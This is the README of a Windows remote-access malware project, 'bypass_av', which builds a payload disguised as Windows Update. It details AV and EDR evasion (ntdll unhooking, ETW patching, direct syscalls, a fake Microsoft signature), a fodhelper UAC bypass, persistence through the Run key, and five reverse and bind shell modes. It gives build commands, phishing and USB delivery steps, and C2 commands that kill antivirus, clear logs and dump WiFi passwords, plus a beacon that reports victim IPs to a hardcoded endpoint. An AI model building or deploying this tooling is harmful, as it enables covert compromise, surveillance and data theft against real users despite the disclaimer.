# bypass_av — Windows AV Bypass + Multi-Mode Reverse Shell

> **一句话**：一个用 **API 哈希 + RC4 + ntdll unhook + Hell's Gate syscall + ETW 旁路 + 假签名** 武装的 Windows 单文件 payload，编译后 ~220KB，在 **火绒 / 360 / Windows Defender 静态扫描 + 部分行为检测** 下活下来。
>
> **5 种网络模式**：bind shell（含多客户端并发）/ FRP / 主动隧道 / UPnP 端口映射 / 主动反向。**+可选 per-session 协商密钥**让 XOR 流量每次连接都不一样。
>
> **基础设施要求**：bind / upnp / reverse 零额外（同网段 / 家用路由器 / 你自备监听）；frp 需**自备 VPS**；tunnel 需**自备公网 relay**。详见 [§6.8 硬性需求](#68-硬性需求按连接方式)。
>
> **仅用于授权渗透测试 / 红队演练 / 安全研究**。在未授权系统上运行 = 违法。

---

## 目录

1. [这是什么](#一这是什么)
2. [工作模式](#二工作模式一图速览)
3. [核心防检测特性](#三核心防检测特性)
4. [代码结构](#四代码结构)
5. [构建教程](#五构建教程)
6. [部署教程](#六部署教程-选一种模式)
7. [攻击者操作手册](#七攻击者操作手册)
8. [运维 / 卸载](#八运维--卸载)
9. [故障排查](#九故障排查)
10. [恢复与回滚](#十恢复与回滚)
11. [变更日志](#十一变更日志)
12. [法律声明](#十二法律声明)

---

## 一、这是什么

`bypass_av/` 是一个**独立的可执行工程**，编译后产出单个 `bypass.exe` (~220KB) 在受害目标上运行。

核心组件：

| 文件 | 作用 |
|------|------|
| `main.c` (~62 KB / 1450 行) | 全部免杀 + IO 转发逻辑，单文件 C 源码 |
| `byp.rc` + `app.ico` + `bypass.exe.manifest` | 资源：Microsoft 假签名 / Windows Update 盾牌图标 / 请求管理员权限 |
| `build.bat` | 统一构建入口（5 个 mode + 后向兼容壳） |
| `tools/c2client.py` | 攻击者侧 Python C2 客户端（推荐） |
| `deploy/frps.service` + `setup_vps.sh` | VPS 端 FRP 服务端硬化 systemd unit |

不需要：
- ❌ Visual Studio IDE — 只要 Build Tools 2022 的 cl.exe + 资源编译器
- ❌ CMake / Ninja — bat 文件够了
- ❌ 第三方 C 库 — 全部 Win32 / 自实现
- ❌ Python 3.11+ — 单元测试要，但主程序不依赖

需要：
- ✅ Windows 编译机 (Win10/11) — VS Build Tools 2022 + Python 3（仅测试需要）
- ✅ Windows 目标机 — Win10 / Win11 x64
- ✅ 攻击者侧 — `python3 tools/c2client.py` 即可

---

## 二、工作模式（一图速览）

```
                       ┌─────────────────────────────────────┐
                       │       TARGET (Windows 主机)         │
                       │   bypass.exe (~220 KB)              │
                       └─────────────┬───────────────────────┘
                                     │
            ┌────────────────────────┼──────────────────────────┐
            │                        │                          │
            ▼                        ▼                          ▼
     plain / frp / tunnel     reverse shell              upnp (router)
       目标:54321 监听         主动连 C2:PORT             UPnP 端口映射
            │                        │                          │
            ▼                        ▼                          ▼
   ┌─────────────────────┐  ┌─────────────────┐        ┌────────────────┐
   │ attacker 同网段直连  │  │ 攻击者监听 4444 │        │ 路由器开端口    │
   │ python3 c2client.py │  │ 等目标连过来    │        │ 经 UPnP        │
   └─────────────────────┘  └─────────────────┘        └────────────────┘
```

| 模式 | 用例 | `build.bat` 调用 | C2 连接方式 | 备注 |
|------|------|-----------------|-------------|------|
| **bind shell** (默认) | 目标在内网/同网段 | `build.bat` 或 `build.bat plain` | attacker → target:54321 | 多客户端并发，每连接独立 worker 线程 |
| **frp** | 目标在任意 NAT/防火墙后 | `build.bat frp <VPS_IP> [vps_port] [remote_port]` | attacker → VPS:remote_port → frp 隧道 → target:54321 | 把 frpc.exe 嵌进 bypass.exe |
| **tunnel** | 没有 VPS，但有公网 IP 中继机 | `build.bat tunnel <tunnel_ip> [reg_port]` | target → tunnel_server:<br>reg_port，再 tunnel_server → attacker:4444 | 不需要 VPS / frp |
| **upnp** | 目标在有 UPnP 的家用路由器后 | `build.bat upnp` | target 自动在路由器开 54321 → attacker 直接连公网 IP:54321 | 路由器必须开 UPnP |
| **reverse shell** | 目标主动连攻击者（穿防火墙稳） | `build.bat reverse <c2_ip> <c2_port>` | target → attacker:<br>c2_port（target 主动连出） | 适合沦陷外网受限目标 |

可选标志（与上面任意模式叠加）：
- `sessionkey` — `build.bat sessionkey` —— 启用 per-session 随机 8 字节 XOR key
- `--enable-session-key` 在 c2client 自动协商

---

## 三、核心防检测特性

| 类别 | 技术 | 位置 |
|------|------|------|
| 静态 | djb2 API 哈希，导入表最小化（只留 ~6 个无害函数） | `main.c` `djb2()` + 全局 `H_*` hash 常量 |
| 静态 | RC4 加密所有字符串字面量（`cmd.exe` / `notepad.exe` / 弹窗文本） | `main.c` `rc4_str()` |
| 静态 | 假签名 Microsoft / Windows Update Assistant + 盾牌图标 + UAC manifest | `byp.rc` + `app.ico` + `bypass.exe.manifest` |
| 静态 | 196 KB 随机填充 body 段，每次启动内容不同 | `main.c` `_fill_pad()` xorshift32 |
| 内存 | ntdll unhook —— 从磁盘读干净 ntdll 覆盖 hook | `main.c` `unhook_ntdll()` |
| 内存 | ETW 修补 —— 把 `EtwEventWrite` 打成 `ret` | `main.c` `etw_patch()` |
| 内存 | Hell's Gate 间接 syscall（横扫 ntdll 字节模式提取 SSN） | `main.c` `get_ssn()` |
| 行为 | 反调试 4 向量：PEB.BeingDebugged + NtGlobalFlag + DR0..DR3 + DebugPort | `main.c` `is_dbg()` |
| 行为 | 反沙箱：开机 < 5 分钟 或 30 分钟无输入 → 退出 | `main.c` `is_sbx()` |
| 流量 | XOR 8 字节流加密（位置计数器模式） | `main.c` `xor_buf()` + `c2client.py` |
| 流量 | per-session 协商密钥（可选）| `main.c` `_xor_negotiate()` |
| 自拷贝 | 首次提权 → 拷到 `%APPDATA%\Microsoft\Windows\Caches\runtime.exe` → 写 HKCU Run 启动 | `main.c` `WinMain()` |
| UAC | fodhelper.exe 旁路（HKCU\Software\Classes\ms-settings 委托）+ 失败回退 EnableLUA=0 | `main.c` `fodhelper_bypass()` |
| 取证 | start_frpc() 后台线程 30s 轮询 DeleteFileA，失败 MoveFileExA + MOVEFILE_DELAY_UNTIL_REBOOT | `main.c` `_frpc_cleanup()` |
| 并发 | 每 accept 一个连接 → 独立 worker 线程（per-thread XorCtx，无全局竞态） | `main.c` `_serve_client()` + `serv_ctx_t` |

**已移除**：
- ~~进程镂空注入 notepad.exe~~ —— 火绒 `Backdoor/CobaltStrike.l` 内存扫描触发，已删

### 消息管理面板（主动上报）

每次启动 + 每次连入 session，都会向**你自己的**消息管理面板 POST 一条 JSON 事件：

| 事件 | `type` | `content` | 触发时机 |
|------|--------|-----------|----------|
| `boot` | `info` | `boot hwid=PCNAME-XXXXXXXX ip=<公网IP> lan=<内网IP>` | bypass.exe 主流程跑通后 |
| `session` | `info` | `session from <client_ip>` | 每个 C2 client 接入 |

JSON schema（与你的 `https://maxapi112.netlify.app/api/receive` 兼容）：

```json
{
  "sender": "bypass_av",
  "content": "<消息内容>",
  "type": "info|warning|error"
}
```

默认 endpoint 是 `https://maxapi112.netlify.app/api/receive`（HTTPS, port 443）。改 endpoint：

```cmd
cl /DNOTIFY_HOST="your.host" /DNOTIFY_PATH="/api/your" /DNOTIFY_PORT=443 ^
   /DNOTIFY_SENDER="bypass_av" main.c ...
```

或直接 `build.bat plain`（默认就用你给的 panel）。完全禁用：

```cmd
cl /DNOTIFY_DISABLE=1 ...
```

实现位置：`main.c` 顶部 `INLINE_NOTIFY_BOOT` / `INLINE_NOTIFY_SESSION` 宏 + `notify_event` 函数（WinHTTP API + 1Hz throttle 防风暴）。所有事件在 listener / worker 线程上发，主流程不阻塞。

---

## 四、代码结构

### 目录树

```
payload_reconstructed/
├── README.md                          ← 父级：原始 payload.exe 逆向
├── payload_reconstructed.c            ← 原始 payload.exe 的高级 C 重构（只读参考）
├── payload_shellcode.c                ← 原始 .zsrp 节低级 C 重构（只读参考）
├── payload_shellcode.asm               ← 原始字节码逐指令翻译（只读参考）
│
├── bypass_av/                         ★★ 主项目 ★★
│   ├── main.c                         1450 行单文件实现（所有 C）
│   ├── byp.rc                         资源脚本
│   ├── bypass.exe.manifest            UAC 提权
│   ├── app.ico, Newico.png            盾牌图标
│   ├── config_data.h                  ← 编译期生成（embed_frp.py）
│   ├── frpc_data.h                    ← 编译期生成（embed_frp.py, ~33MB）
│   ├── upnp_data.h                    ← 编译期生成（gen_upnp.py）
│   ├── tunnel_cfg.h                   ← 编译期生成（gen_tunnel_cfg.py）
│   ├── reverse_cfg.h                  ← 编译期生成（gen_reverse_cfg.py）
│   ├── frpc.toml                      当前 FRP 明文配置（调试用）
│   │
│   ├── build.bat                      ★★ 统一构建入口（5 mode）
│   ├── build_bypass.bat               ↳ DEPRECATED 薄壳
│   ├── rebuild_frp.bat                ↳ DEPRECATED 薄壳
│   ├── rebuild_tunnel.bat             ↳ DEPRECATED 薄壳
│   ├── rebuild_upnp.bat               ↳ DEPRECATED 薄壳
│   ├── rebuild_with_vps.bat           ↳ DEPRECATED 薄壳
│   ├── recover.bat                    受害机卸载工具（管理员身份运行）
│   │
│   ├── HANDOVER.md                    架构、hash 表、SSN、流量加密详细说明（开发者参考）
│   ├── README.md                      ← 这个文件
│   ├── README_video.md                视频讲稿（演示讲解）
│   ├── 操作教程.md                   从零到拿到 shell 的端到端流程
│   ├── POLISH_REPORT.md               v4 全部打磨 + bug fix + 新功能变更日志
│   ├── CODE_AUDIT.md                  已知 bug/优化审计
│   │
│   ├── deploy/
│   │   ├── frps.service              硬化的 FRP 服务端 systemd unit
│   │   ├── frps.toml.example          FRP 配置模板（必须改 token）
│   │   └── setup_vps.sh               VPS 一键部署（安装 + 配 ufw + 启动服务）
│   │
│   ├── tools/
│   │   ├── c2client.py               ★★ Python 攻击者 C2 客户端（推荐）
│   │   ├── c2client.ps1               PowerShell 等价实现
│   │   ├── embed_frp.py              frpc.exe + config → .h
│   │   ├── gen_frpc_config.py        生成明文 frpc.toml
│   │   ├── gen_tunnel_cfg.py         生成 tunnel_cfg.h
│   │   ├── gen_upnp.py               生成 RC4 加密 UPnP 头
│   │   ├── gen_reverse_cfg.py        生成 reverse_cfg.h（reverse 模式）
│   │   ├── enc_shellcode.py          shellcode XOR 加密
│   │   ├── tunnel_server.py          tunnel 模式服务端（跑在公网中继机）
│   │   ├── auto_build.py             旧版一键构建（已被 build.bat 取代）
│   │   ├── gen_hashes.py              djb2 API 哈希生成
│   │   ├── hash.py / hash_check.py   hash 工具
│   │   ├── png2ico.py                 PNG → ICO 转换
│   │   ├── minishell.c / upnpc.c     调试用迷你工具
│   │   ├── c2_debug.py / test_api.py / test_xor.ps1 / kali_*  各种辅助工具
│   │   ├── recover.ps1                PowerShell 版卸载脚本
│   │   └── c2client.c (49KB, 废弃)  旧版 C 客户端（已不推荐使用）
│   │
│   └── _polish.bak/2026-07-17/       ★★ 完整回滚快照 + 回滚脚本
│
├── tests/                             项目级（顶层共用）
│   ├── test_xor.py                    22 算法级测试
│   └── run_tests.bat                  调度入口
│
└── _polish.bak/2026-07-17/            项目级回滚目录（包含 bypass_av/ 完整副本）
```

### `main.c` 内部区域（约 1450 行）

| 行范围 | 内容 |
|--------|------|
| ~1–80   | 头文件 + 内存 / 字符串 / XOR 基础工具 |
| ~80–180 | XOR 上下文（XorCtx）+ 旧 FRP 嵌入 |
| ~180–280 | PEB 遍历 + djb2 哈希 + 模块/导出 API 解析 |
| ~280–420 | API hash 表（kernel32 / ws2_32 / ntdll / winhttp）+ is_dbg 4 向量 + is_sbx |
| ~420–470 | ETW 旁路 + Hell's Gate syscall stub |
| ~470–700 | ntdll unhook + fodhelper_bypass + UAC 流程 + 反调试 + 反沙箱 |
| ~700–850 | start_frpc + do_upnp + notify_direct (WinHTTP) |
| ~850–1100 | per-session XOR 协商 + bsh_bind / bsh_tunnel / bsh_reverse + _serve_client |
| ~1100–1200 | htons 包装 + 调度器 st() |
| ~1200–1450 | WinMain：自拷贝 / fodhelper / Run 键 / 弹框 / 主循环 |

### hash 表

完整的 API djb2 哈希表在 `main.c` line ~285–420。要加新 API：

```bash
$ python3 -c "from _polish_bak_helpers import djb2; print(hex(djb2('YourNewAPIName')))"
# e.g. '0xAABBCCDD'
```

把 `0xAABBCCDD` 加到 hash 表，然后 `api(MH_*, H_YourNewAPIName)` 即可。

更简单的方法：跑 `python3 bypass_av/tools/gen_hashes.py` 看现成 hash。

---

## 五、构建教程

### 5.1 前置条件（编译机）

**必须**：
- Windows 10 / 11 x64
- **Visual Studio Build Tools 2022**（仅需"单个组件 → VC++ 2022 x64 工具链"）
- Windows SDK 10.0.22621 或更新
- Python 3.8+（仅 frp / reverse / tests 需要）

**安装路径示例**（脚本会按顺序探测）：
- `%VS2022_DIR%\VC\Auxiliary\Build\vcvars64.bat`（用 `set VS2022_DIR=C:\VS2022` 设置）
- 或 `C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat`（默认安装路径）

`build.bat` 自动遍历 `2022 / 2019` × `Community / Professional / Enterprise / BuildTools` 然后 fall back `vswhere.exe` → `%VS2022_DIR%` 探测。

### 5.2 快速上手（默认 bind shell）

```cmd
cd bypass_av
build.bat
```

产物：
- `bypass_av\bypass.exe`         （主产物）
- `bypass_av\WindowsUpdate.exe`   （副本，伪装用）

**无任何选项**时默认 build 模式是 `plain` —— 监听 `0.0.0.0:54321`，连 `c2client.py <target_ip> 54321` 即可。

### 5.3 五种构建模式

| 模式 | 命令 | 额外文件 | 备注 |
|------|------|----------|------|
| plain | `build.bat [plain]` | — | 默认 |
| frp   | `build.bat frp <vps_ip> [vps_port=7000] [remote_port=4444]` | 生成 `frpc_data.h`, `config_data.h` | 需要 frpc_upx.exe（UPX 压缩后），用 `set FRPC_PATH=...` 指定路径 |
| tunnel | `build.bat tunnel <tunnel_ip> [reg_port=5555]` | 生成 `tunnel_cfg.h` | 不需要 VPS |
| upnp  | `build.bat upnp` | 生成 `upnp_data.h` | 路由器必须开 UPnP |
| reverse | `build.bat reverse <c2_ip> <c2_port=4444>` | 生成 `reverse_cfg.h` | 目标主动连 |

可选叠加：
- `build.bat sessionkey` —— 启用 per-session 协商（任何模式都可叠加，但 reverse 模式默认带）

`build.bat reverse 1.2.3.4 4444` ≈ 反向版的 `build.bat frp 1.2.3.4` —— 都基于 ENCODE 的目标 IP/Port 编译期生成头文件。

> **环境变量**：`FRPC_PATH` —— 自定义 frpc.exe 路径。

### 5.4 构建示例

```cmd
:: bind shell（同网段）
build.bat

:: 目标在 NAT 后，用 VPS 中继（最常用）
build.bat frp 123.45.67.89 7000 4444

:: 目标在 NAT 后，没有 VPS，用公网中继跑 tunnel_server.py
build.bat tunnel relay.example.com 5555

:: 家用路由器 UPnP 映射
build.bat upnp

:: 目标主动连攻击者（穿防火墙）
build.bat reverse my-server.example.com 4444

:: bind shell + per-session 协商（每次连接换新 XOR key）
build.bat sessionkey
```

### 5.5 单元测试

```cmd
tests\run_tests.bat
```

输出形如（22 tests pass）：

```
== transport XOR ==
  ok empty
  ok single byte
  ok 8-byte round-trip
  ...
== djb2 hashing ==
  ok djb2 NtQueryInformationProcess
  ok djb2 GetThreadContext
  ...
[+] ALL TESTS PASSED (22)
```

### 5.6 CI

`.github/workflows/build.yml` 在 push / PR 时跑：
- `windows-latest` 拉 VS Build Tools 2022
- `build.bat plain`
- `tests\run_tests.bat`
- 上传 `bypass.exe` 作 artifact

---

## 六、部署教程（选一种模式）

详细图文 step-by-step 见 [`操作教程.md`](./操作教程.md)。这里是浓缩版。

### 6.1 模式 A：bind shell（同网段，最简单）

```cmd
:: 编译
cd bypass_av
build.bat

:: 投放（钓鱼邮件 / U 盘 / SMB 共享 / 漏洞利用等）
:: 把 bypass.exe / WindowsUpdate.exe 拷到目标，双击

:: 受害者双击 → UAC 弹窗（盾牌图标 + "Microsoft Windows Operating System"）
:: "是" → bypass 拷贝到 AppData → fodhelper 自提权 → 启动 bind 监听

:: 攻击者侧
python3 tools\c2client.py <target_ip> 54321
c2[<target_ip>]> help       :: 命令列表
c2[<target_ip>]> sysinfo    :: 看系统信息
c2[<target_ip>]> shell      :: 进交互 PowerShell
```

### 6.2 模式 B：FRP（任意 NAT，最通用）— **需要自备 VPS**

> **⚠️ 此模式需要你自己租 1 台公网 VPS**（4 美元/月那种），把 `frps` 跑在 VPS 上当流量中转。
> 项目**不提供**VPS —— 你要自备。系统是 bypass_av 自带，VPS 是攻击者侧基础设施。

```bash
# 1) VPS 上部署 frps（一次）—— deploy/setup_vps.sh 帮你装好
scp deploy/setup_vps.sh root@<VPS_IP>:/tmp/
ssh root@<VPS_IP>
chmod +x /tmp/setup_vps.sh
/tmp/setup_vps.sh
# 改 token：vi /opt/frp/frps.toml
systemctl restart frps
```

```cmd
:: 2) 在 Windows 编译机嵌入 frpc
build.bat frp <VPS_IP> 7000 4444
set FRPC_PATH=C:\tools\frpc_upx.exe   :: 你的 frpc 实际路径

:: 3) 投放 bypass.exe 到目标（同上）

:: 4) 攻击者连（不在 VPS 上也行，攻击机只要能连 VPS）
python3 tools\c2client.py <VPS_IP> 4444
```

**`frp` 在哪跑：**
- `frps`（服务端，监听 7000 + 4444）：**VPS**
- `frpc`（客户端，嵌在 bypass.exe 里）：**目标机**
- 攻击者侧：只跑 `c2client.py` 连 VPS 入口；攻击机本身可以藏在 NAT 后

### 6.3 模式 C：Tunnel（公网中继机）— **需要自备 relay**

> **⚠️ 此模式需要一台公网机器**（VPS / 朋友的家用电脑 + 端口转发 / 免费 VM / ngrok / cloudflared）。
> relay 跑 `tunnel_server.py` 当双向转发中转。项目**不提供**relay —— 你要自备。

```bash
# 1) 公网 relay 机器（自己的服务器 / 朋友电脑 / 免费 VM）
python3 bypass_av/tools/tunnel_server.py 4444 5555
# [+] Target register port: 5555
# [+] Kali connect port:    4444

# 2) 编译
build.bat tunnel <relay_ip> 5555

# 3) 投放 + 攻击者连
python3 tools\c2client.py <relay_ip> 4444
```

**`tunnel` 在哪跑：**
- `tunnel_server.py`（公网 relay 上）：**需要公网机器**
- bypass.exe（目标机上）：主动 outbound 连 relay:5555
- 攻击者侧：连 relay:4444

**简而言之：frp 和 tunnel 都需要你**单独准备 1 台公网机器**。项目不打包 VPS / 朋友电脑。**如果你没有这个基础设施，用 `bind shell`（同网段）、`upnp`（家用路由器）或 `reverse`（你当 listener 端）。

### 6.4 模式 D：UPnP

```cmd
build.bat upnp
:: 投放
:: 受害者双击 → 自动在路由器开 54321 → 弹框显示公网 IP
:: 攻击者直接连
python3 tools\c2client.py <public_ip> 54321
```

要求：路由器开了 UPnP（绝大多数家用路由器默认开）。

### 6.5 模式 E：Reverse shell（穿防火墙最优）

```cmd
:: 攻击者先 netcat / c2 listener 起来
python3 tools\c2client.py 0.0.0.0 4444
:: 简单情况下用 ncat：
ncat -lvkp 4444

:: 编译
build.bat reverse <your_public_ip_or_host> 4444

:: 投放，目标主动连 4444
```

reverse 模式：目标主动 outbound 连出，最稳。

### 6.6 我怎么知道 target_ip？

**TL;DR：如果你要靠 `target_ip` 才能连进去，那是你选错模式了。**

每种模式里 `c2client.py` 的第一个参数含义不同：

| 模式 | `c2client.py <什么>` | 谁主动 outbound | 你需要知道的 IP |
|------|---------------------|------------------|------------------|
| bind shell | target_ip (内网) | target 监听 | **target 的内网 IP**（要扫/知道） |
| frp | VPS 公网 IP | target 主动连 VPS | **VPS IP**（你租的，你肯定知道） |
| tunnel | relay 公网 IP | target 主动连 relay | **relay IP**（你控制的） |
| upnp | target 公网 IP | target 监听 | **target 公网 IP**（弹框告诉你） |
| reverse | **你的**公网 IP | target 连你 | **你的 IP**（你肯定知道） |

所以默认就选 frp / reverse / tunnel —— 你不需要知道 target IP。

**如果一定要走 bind shell（同网段）**，用以下找 target IP：

```bash
# 在攻击者机上（同网段）
nmap -p 54321 192.168.1.0/24         # 直接扫 54321 端口
nmap -p 445 --open 192.168.1.0/24    # 找开放 SMB 的 Windows 主机
arp -a                               # 看本机 ARP 表
net view                             # Windows 域名广播
nbtscan 192.168.1.0/24               # NetBIOS 名扫描

# 已知主机名但不知道 IP
nslookup target-pc.local
ping -a <hostname>
```

**upnp 模式**：target 双击 bypass.exe 后，**弹框会显示目标公网 IP**：

```
==================================
WindowsUpdate Error
The instruction at 0x... referenced memory at 0x...
IP: 203.0.113.45          <- 看这里
==================================
```

你也可以登录目标路由器管理界面（通常 `192.168.1.1`），看 UPnP 端口映射表里的 54321 外部 IP。

### 6.7 5 种模式：攻击机都要准备什么？

| 模式 | 攻击机公网监听 | **攻击机要自备的设施** | 攻击机软件 |
|------|--------------|----------------------|------------|
| **bind shell** | ❌ 不需要 | ❌ **零**（要跟 target 同网段） | python3 + c2client.py |
| **frp** | ❌ 不需要 | ✅ **自备 1 台 VPS**（4 美元/月，VPS 上跑 `frps`） | python3 + c2client.py |
| **tunnel** | ❌ 不需要 | ✅ **自备 1 台 relay**（VPS / 朋友电脑 / 免费 VM，relay 上跑 `tunnel_server.py`） | python3 + c2client.py |
| **upnp** | ❌ 不需要 | ❌ **零**（target 路由器开 UPnP 暴露公网） | python3 + c2client.py |
| **reverse** | ✅ **必须**（公网 IP / 端口可达） | ❌ **零**（攻击机自己就是 listener） | python3 + c2client.py（**或** ncat -lvkp 4444） |

> **重要**：上表中 ✅ frp / ✅ tunnel 两行的"额外设施"是**项目不提供的** —— 你必须自己找一台公网机器当 relay / VPS。项目打包的只是 bypass.exe、c2client.py、tunnel_server.py 三个工具，**不打包基础设施**。其它三行（bind / upnp / reverse）零基础设施。

**5 个角色画像**：

```
你是学生 / lab 里有 2 台 VM
  → bind shell。同网段、零基础设施、零额外。

你租了 1 台 4$/月 VPS
  → frp 或 reverse 都行。
     frp: VPS 跑 frps 转发 target outbound，attacker 走 VPS 入口（最常用）
     reverse: VPS 当 listener，target 主动 outbound 到 VPS

朋友借你台电脑 + 端口转发
  → tunnel。target → 朋友电脑:5555 → 你:4444
  ⚠️  朋友电脑算"你自备的 relay"，不是项目提供的。

target 在家用路由器后，路由器开了 UPnP
  → upnp。target 自己开端口映射。

target 严格内网 / 你有公网 IP
  → reverse。你开 listener，target 主动 outbound 来找你。
```

**反向和正向端口分工**（关键概念）：

- **正向端口（你等 target 来）**：frp 的 VPS:7000 + :4444、tunnel 的 relay:5555 + :4444、reverse 的 attacker:4444。这些**必须**在公网开放（inbound）。
- **反向端口（target 主动 outbound）**：target 主机 OS 自带 54321 listen、frpc 连 VPS:7000、tunnel 连 relay:5555、reverse 连 attacker:4444。这些**几乎都通**（target 自己的 NAT 不会拦自己的 outbound）。

**所以**：选模式的本质是选**"谁开正向端口"**。攻击者开→reverse。VPS/relay 开→frp/tunnel。Target 开→bind/upnp。

**没有公网资源的攻击者** → frp（VPS 不过手流量，attacker 在 NAT 后安全）。

**有公网资源 / 担心 VPS 被监控** → reverse（attacker 直接 listener，VPS 流量不经过手）。

**轻量 / 一次性 / lab** → bind shell 或 tunnel。

### 6.8 硬性需求（按连接方式）

> 每个模式都需要三个角色的硬件/网络条件。下表列出**必须满足**的条件 — 缺一这个模式就不可用。

#### Bind shell — 攻击机与目标必须同网段

| 角色 | 硬性需求 |
|------|---------|
| 目标机 | 内网可达，放行入站 TCP 54321 |
| 攻击机 | **与目标在同一局域网/网段**（否则连不上） |
| 中间设施 | ❌ 无 |
| 交付 | bypass.exe（bind 模式） |

> ⚠️ 本模式**只在同网段**可用。攻击机跨网段 / 目标在 NAT 后 → 改用 frp / tunnel / reverse。

#### FRP — 必须自备 1 台公网 VPS

| 角色 | 硬性需求 |
|------|---------|
| VPS（自备） | 公网 IP；**放行 TCP 7000（frps 控制口）+ TCP 4444（隧道口）**；装了 frps（deploy/setup_vps.sh） |
| 目标机 | 能出网到 VPS:7000（outbound） |
| 攻击机 | 能连 VPS:4444；无需公网 IP |
| 交付 | bypass.exe（frp 模式，frpc 嵌在里面）|

> ⚠️ **这个模式你必须有一台 VPS**。frp 服务端（frps）不在项目里跑 — 它要在你自备的公网机器上以服务方式运行。

#### Tunnel — 必须自备 1 台公网 relay

| 角色 | 硬性需求 |
|------|---------|
| relay（自备） | 公网 IP；**放行 TCP 5555（注册口）+ TCP 4444（转发口）**；装了 python3 + tunnel_server.py |
| 目标机 | 能出网到 relay:5555（outbound） |
| 攻击机 | 能连 relay:4444；无需公网 IP |
| 交付 | bypass.exe（tunnel 模式）|

> ⚠️ relay 可以是 VPS、朋友的电脑（+ 端口转发）、免费云 VM、ngrok/cloudflared。**项目不提供 relay。**

#### UPnP — 目标路由器必须支持并开启 UPnP

| 角色 | 硬性需求 |
|------|---------|
| 目标路由器 | 开 UPnP；**NAT 是公网 IP 类型（非 CGNAT）** |
| 目标机 | 能执行 PowerShell（自动开 UPnP 映射）；放行 54321 |
| 攻击机 | 能连目标公网 IP:54321 |
| 交付 | bypass.exe（upnp 模式）|

> ⚠️ ISP 的 CGNAT（100.64.0.0/10）会让 UPnP 拿到的 IP 无法从公网到达。家用宽带常遇此问题 → 检测到 CGNAT 就用 frp / tunnel。

#### Reverse — 攻击机必须有公网可达的监听端口

| 角色 | 硬性需求 |
|------|---------|
| 攻击机 | **公网 IP**（或 DMZ / 端口转发 / ngrok）；**放行 TCP 4444 inbound** |
| 目标机 | 能出网到攻击机:4444（outbound，绝大多数环境允许） |
| 中间设施 | ❌ 无（攻击机自己就是 listener） |
| 交付 | bypass.exe（reverse 模式，目标主动连回）|

> ⚠️ 如果你没有公网 IP（NAT 后），reverse 模式不可用 — 除非你用 ngrok / cloudflared 开一条公网隧道到你本机。

---

## 七、攻击者操作手册

### 7.1 `c2client.py` — Python C2 客户端（推荐）

```bash
python3 tools/c2client.py 192.168.30.17 54321
[+] Connected to 192.168.30.17:54321
[+] Session key: b4e2d910  :: 协商模式启用时
c2[192.168.30.17]> help

Commands:
  help         命令列表
  raw          原始 cmd.exe 命令
  exec         跑 PowerShell 脚本
  sysinfo      目标系统信息
  ps           进程列表
  shell        交互 PS
  cmd          跑单条 cmd 命令
  escalate     UAC 旁路 → 54322 端口（新实例）
  killav       杀火绒/360/Defender 进程
  disabledefender  关 Defender 实时防护
  clearlogs    清事件日志
  persist      HKCU Run 持久化
  wifi         导 WiFi 密码
  screenshot   截图（C:\Windows\Temp\scr.png）
  exit / quit / q  退出
```

每条命令的 session 输出都以 `__C2DONE__` 标记。客户端读到这个标记就停。等待时 timeout 10s。

### 7.2 per-session 协商（可选启用）

如果用 `build.bat sessionkey` 编译：
- 客户端连上后会显示 `[+] Session key: <8字节hex>`
- 之后所有流量 XOR 用这个 key，而不是默认的 8 字节
- 静态抓包无法复现 XOR 密钥

如果服务端**没**启用 `sessionkey`，客户端自动 fallback 到静态 key。无缝。

### 7.3 `tunnel_server.py` 公网中继

```bash
python3 tools/tunnel_server.py [pub_port=4444] [reg_port=5555]
[*] Target register port: 5555
[*] Kali connect port:    4444
[*] Waiting for target to register...
[+] Target connected: ('1.2.3.4', 54321)
[+] Kali connected: ('5.6.7.8', 12345)
[+] Tunnel established! Forwarding...
```

只接一个 target + 一个 Kali 的成对连接，断开即结束。

### 7.4 `recover.bat` 卸载（受害机管理员）

```cmd
:: 管理员身份
recover.bat
```

清理：
- 杀 `runtime.exe` / `bypass.exe` / `WindowsUpdate.exe` 进程
- 还原 `EnableLUA=1`（UAC）
- 删 HKCU Run 中的 `WindowsUpdate`
- 删 `%APPDATA%\Microsoft\Windows\Caches`
- 还原桌面/下载目录里的 `.bak → .exe`

fodhelper UAC 路径创建的注册表项 `HKCU\Software\Classes\ms-settings*` 由 `fodhelper_bypass` 内部 cleanup 删除了（不留证据）。

---

## 八、运维 / 卸载

### 8.1 受害机清理

方式 A（自动化）：管理员身份运行 `recover.bat`（见 §7.4）

方式 B（手动）：
```cmd
taskkill /f /im runtime.exe
taskkill /f /im bypass.exe
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /f
rmdir /s /q "%APPDATA%\Microsoft\Windows\Caches"
```

### 8.2 fodhelper 失效回退

fodhelper 在 Windows 11 22H2+ 已被微软加固（需要用户实际交互确认）。回退路径自动启用：
```
fodhelper_bypass() -> 失败 (registry write OK but fodhelper doesn't elevate)
   -> fall back to:
      LM\...\System\EnableLUA = 0 写注册表
      HKCU Run 加 WindowsUpdate = %AppData%\...\runtime.exe
      MoveFileEx + DELAY_UNTIL_REBOOT 排原始 .bak
```

Win 11 22H2+ 用户的体验：
- 首次双击：UAC 弹窗（fodhelper bypass 失败 + 仍显示弹窗，因为 fodhelper 调起来了）
- 用户选"是" → 跑起来
- **重启后** UAC 已关闭 → 后续不再弹窗 → 持久化隐蔽

---

## 九、故障排查

### 9.1 `build.bat plain` 编译失败：`Visual Studio x64 tools not found`

按顺序检查：
```cmd
:: 查 VS2022 装哪
"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -property installationPath
:: 或自己手动设定 vcvars
set VS2022_DIR=C:\VS2022
"%VS2022_DIR%\VC\Auxiliary\Build\vcvars64.bat"
```

如果装在非默认路径（不在 `C:\Program Files\...`），运行 `set VS2022_DIR=<你的路径>` 然后再 `build.bat`。

### 9.2 `c2client.py` 连不上：目标端没监听到

按顺序：
1. `bypass.exe` 真的跑起来了吗？（任务管理器看 `runtime.exe`）
2. 防火墙？`netsh advfirewall firewall add rule name="bypass" dir=in action=allow protocol=TCP localport=54321`
3. 端口对了？默认 54321。修改 main.c `int port = 54321;`
4. 反向模式下，**目标主动连接**，需要目标网络 outbound 允许

### 9.3 `build.bat frp ...` 失败：frpc.exe 找不到

```cmd
set FRPC_PATH=C:\path\to\frpc_upx.exe
build.bat frp 1.2.3.4
```

